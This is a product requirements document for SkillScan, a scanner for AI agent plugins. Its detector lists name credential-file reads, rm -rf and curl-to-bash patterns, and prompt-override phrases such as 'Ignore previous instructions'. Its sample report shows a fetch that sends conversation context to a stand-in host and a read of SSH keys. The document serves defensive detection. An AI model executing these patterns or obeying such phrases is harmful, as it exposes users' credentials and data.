# SkillScan — Product Requirements Document

## 1. Vision

SkillScan is the security standard for AI agent plugins. A single command that tells you if a skill is safe to install — before it gets access to your computer, files, and APIs.

**One-liner:** `npx skillscan ./my-skill` → Security report with risk score in seconds.

**Tagline:** "Know before you install."

## 2. Problem Statement

The AI agent ecosystem has a critical security gap:

- **1,184 confirmed malicious skills** found in OpenClaw's ClawHub marketplace (Antiy CERT, Feb 2026)
- **7%+ of skills expose sensitive credentials** (Snyk research, Feb 2026)
- **135,000 OpenClaw instances** exposed to the internet with insecure defaults (SecurityScorecard)
- **88% of organizations** had AI agent security incidents in the past year (Gravitee Report, 2026)
- **No existing tool** performs static analysis specifically designed for AI agent skill/plugin security — traditional SAST tools cannot detect threats in LLM-to-tool communication flows
- **Only 29%** of enterprises feel prepared to secure AI agent deployments (Cisco, 2026)

Skills/plugins for AI agents are fundamentally different from regular npm packages because they:
1. Get injected into LLM system prompts (can contain prompt injection)
2. Request broad system permissions (filesystem, network, shell)
3. Execute autonomously without human review of each action
4. Access sensitive context (conversation history, user data, API keys)

## 3. Target Users

### Primary: AI Agent Developers
- Install skills from marketplaces (ClawHub, community repos)
- Build custom skills for their agents
- Need fast, automated security checks before deploying
- Persona: "Alex, solo dev running OpenClaw on a Raspberry Pi"

### Secondary: Marketplace Maintainers
- Run ClawHub, community skill repos, enterprise registries
- Need automated scanning in CI/CD pipelines
- Want a "verified safe" badge system for approved skills
- Persona: "Sarah, DevOps at a company with 50 OpenClaw agents"

### Tertiary: Security Researchers
- Audit agent ecosystems for vulnerabilities
- Need comprehensive scanning with detailed reports
- Want machine-readable output (JSON) for automated analysis
- Persona: "Marcus, security researcher publishing agent security advisories"

## 4. User Stories

### MVP (Phase 1)
- **US-01:** As a developer, I want to run `skillscan ./my-skill` and get a risk score (0-10) so I know if a skill is safe to install.
- **US-02:** As a developer, I want to see which specific lines of code triggered security warnings so I can evaluate them myself.
- **US-03:** As a developer, I want clear severity levels (CRITICAL/HIGH/MEDIUM/LOW) so I know which issues to prioritize.
- **US-04:** As a developer, I want the scan to complete in under 10 seconds for a typical skill so it fits my workflow.
- **US-05:** As a developer, I want to scan a skill without installing it first (scan from directory or git URL).

### Phase 2
- **US-06:** As a marketplace maintainer, I want a GitHub Action that automatically scans PRs adding new skills.
- **US-07:** As a security researcher, I want JSON output so I can process results programmatically.
- **US-08:** As a developer, I want HTML reports I can share with my team.
- **US-09:** As a developer, I want to configure custom rules (allowlist domains, ignore specific detectors).
- **US-10:** As a marketplace maintainer, I want to scan all skills in a directory recursively.

### Phase 3
- **US-11:** As a developer, I want real-time scanning that watches for changes (--watch mode).
- **US-12:** As a marketplace maintainer, I want a dashboard showing security status of all skills.
- **US-13:** As a developer, I want SkillScan to suggest fixes for detected issues.
- **US-14:** As a security researcher, I want to write custom detector plugins.

## 5. Functional Requirements

### 5.1 CLI Interface

```
skillscan <path> [options]

Arguments:
  path                    Path to skill directory, SKILL.md file, or git URL

Options:
  -f, --format <format>   Output format: terminal (default), json, html
  -o, --output <file>     Write report to file instead of stdout
  -s, --severity <level>  Minimum severity to report: critical, high, medium, low, info
  --no-color              Disable colored output
  --config <path>         Path to config file
  --ignore <detectors>    Comma-separated detector IDs to skip
  -q, --quiet             Only output risk score (for CI/CD)
  -v, --verbose           Show detailed analysis for each finding
  --version               Show version
  -h, --help              Show help

Examples:
  skillscan ./my-skill
  skillscan ./my-skill --format json --output report.json
  skillscan ./my-skill --severity high --quiet
  skillscan https://github.com/user/skill-repo
  skillscan ./skills-directory --recursive
```

### 5.2 Detectors

Each detector is an independent module that analyzes one category of risk.

#### D01: Network Exfiltration (`network-exfil`)
- Detect outbound HTTP/HTTPS requests (fetch, axios, http.request, XMLHttpRequest)
- Flag requests to non-allowlisted domains
- Detect data being sent in request body that includes context/conversation/memory variables
- Severity: CRITICAL if sending context data to unknown domains, HIGH if any unknown outbound

#### D02: Filesystem Access (`fs-access`)
- Detect reads from sensitive paths: ~/.ssh, ~/.aws, ~/.config, /etc/passwd, browser profiles
- Detect writes outside expected skill workspace
- Flag use of glob patterns that are overly broad (e.g., `/**`)
- Severity: CRITICAL for credential file access, HIGH for broad filesystem access

#### D03: Shell Execution (`shell-exec`)
- Detect child_process.exec, execSync, spawn with shell:true
- Flag dangerous command patterns: rm -rf, curl|bash, wget piped to sh, chmod 777
- Detect commands constructed from user/LLM input (command injection risk)
- Severity: CRITICAL for dangerous patterns, HIGH for any shell execution

#### D04: Prompt Injection (`prompt-injection`)
- Detect strings in SKILL.md or code that look like prompt injection:
  - "Ignore previous instructions"
  - "You are now..."
  - "System: override"
  - Hidden instructions in HTML comments, zero-width characters, base64
- Detect dynamic prompt construction from external sources
- Severity: CRITICAL for clear injection, MEDIUM for suspicious patterns

#### D05: Credential Exposure (`credential-leak`)
- Detect hardcoded API keys, tokens, passwords in source code
- Regex patterns for known formats: AWS keys (AKIA...), GitHub tokens (ghp_...), etc.
- Detect environment variable access for sensitive names
- Severity: HIGH for hardcoded secrets, MEDIUM for env variable access patterns

#### D06: Code Obfuscation (`obfuscation`)
- Detect eval(), Function(), encoded strings (base64, hex, unicode escapes)
- Detect minified/obfuscated code that shouldn't be in a skill
- Flag dynamic requires/imports
- Severity: HIGH for eval with dynamic input, MEDIUM for obfuscated code

#### D07: Dependency Risk (`dependency`)
- Analyze package.json dependencies
- Check for known malicious packages (maintain blocklist)
- Detect typosquatting (similarity to popular package names)
- Flag packages with postinstall scripts
- Severity: CRITICAL for known malicious, HIGH for postinstall scripts, MEDIUM for typosquatting

#### D08: Permission Scope (`permission-scope`)
- Parse SKILL.md frontmatter for declared permissions/capabilities
- Flag skills requesting more permissions than their code needs
- Detect skills that don't declare permissions but use restricted APIs
- Severity: MEDIUM for excessive permissions, LOW for undeclared

### 5.3 Risk Score Calculation

```
Risk Score = weighted_sum(findings) / max_possible_score * 10

Weights:
  CRITICAL = 10
  HIGH     = 6
  MEDIUM   = 3
  LOW      = 1
  INFO     = 0

Thresholds:
  0.0 - 2.0  →  ✅ SAFE (likely safe to install)
  2.1 - 4.0  →  ⚠️  CAUTION (review findings before installing)
  4.1 - 7.0  →  🔶 WARNING (significant risks detected)
  7.1 - 10.0 →  🛑 DANGER (do NOT install)
```

### 5.4 Report Format (Terminal)

```
🔍 SkillScan v1.0.0 — Analyzing "weather-fetcher"

Scanning... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (8 detectors)

┌─────────────────────────────────────────────────────────────┐
│  Risk Score: 7.4 / 10  🛑 DANGER — Do NOT install          │
└─────────────────────────────────────────────────────────────┘

  🔴 CRITICAL  Network Exfiltration (network-exfil)
     src/index.ts:47 — Sends conversation context to external domain
     → fetch("https://collect.example.xyz", { body: context })
     Fix: Remove outbound request or use allowlisted API endpoint

  🔴 CRITICAL  Filesystem Access (fs-access)
     src/index.ts:23 — Reads SSH private keys
     → fs.readFileSync(path.join(homedir(), '.ssh/id_rsa'))
     Fix: Skills should never access SSH keys

  🟡 MEDIUM    Code Obfuscation (obfuscation)
     src/helpers.ts:12 — Base64 encoded string executed via eval
     → eval(Buffer.from("aW1wb3J0...", "base64").toString())
     Fix: Replace eval with explicit code

  ✅ PASS  Prompt Injection — No injection patterns detected
  ✅ PASS  Credential Exposure — No hardcoded secrets found
  ✅ PASS  Shell Execution — No shell commands detected
  ✅ PASS  Dependency Risk — All dependencies verified
  ✅ PASS  Permission Scope — Permissions match usage

  Summary: 2 critical, 0 high, 1 medium, 0 low | 8 detectors ran in 1.2s
```

## 6. Non-Functional Requirements

- **Performance:** Scan completes in <10 seconds for a typical skill (<50 files)
- **Size:** CLI binary <5MB (ideally <2MB)
- **Compatibility:** Node.js 22+, works on macOS, Linux, Windows
- **Zero config:** Works out of the box with sensible defaults
- **Offline:** Works without internet (except dependency checker)
- **Extensible:** Plugin API for custom detectors (Phase 3)
- **CI-friendly:** Exit code 0 = safe, 1 = warnings, 2 = critical findings

## 7. Out of Scope (for MVP)

- Runtime monitoring (we only do static analysis)
- Automatic fixing/patching of detected issues
- Web dashboard or SaaS version
- Scanning running agents in production
- Network traffic analysis
- Binary/compiled code analysis

## 8. Success Metrics

- **Week 1-2:** Working CLI that scans a skill directory and produces a terminal report
- **Week 3-4:** All 8 detectors implemented with tests, JSON/HTML output
- **Month 2:** GitHub Action published, 100+ GitHub stars
- **Month 3:** Used by at least 1 marketplace or community project
- **Month 6:** 1,000+ GitHub stars, recognized in agent security discussions

## 9. Competitive Analysis

| Tool | Focus | Agent-specific? | Open Source? |
|------|-------|-----------------|--------------|
| Snyk | npm/general packages | ❌ | Partially |
| Semgrep | General SAST | ❌ | ✅ |
| npm audit | npm vulnerabilities | ❌ | ✅ |
| Socket.dev | npm supply chain | ❌ | Partially |
| **SkillScan** | **AI agent skills** | **✅** | **✅** |

**Gap:** No existing tool understands AI-specific threats (prompt injection in SKILL.md, context exfiltration, LLM-to-tool trust boundaries). SkillScan fills this gap.

## 10. Technical Risks

1. **False positives:** Legitimate skills may use fetch/fs for valid reasons. Mitigation: allowlist system + severity tuning.
2. **Obfuscation evasion:** Sophisticated attackers can evade static analysis. Mitigation: obfuscation detection itself is a finding.
3. **Evolving threat landscape:** New attack patterns emerge constantly. Mitigation: detector plugin system + community rules.
4. **Performance with large skills:** Some skills have many files. Mitigation: file size limits + parallel analysis.

## 11. License

Apache 2.0 — Enterprise-friendly, allows commercial use, requires attribution.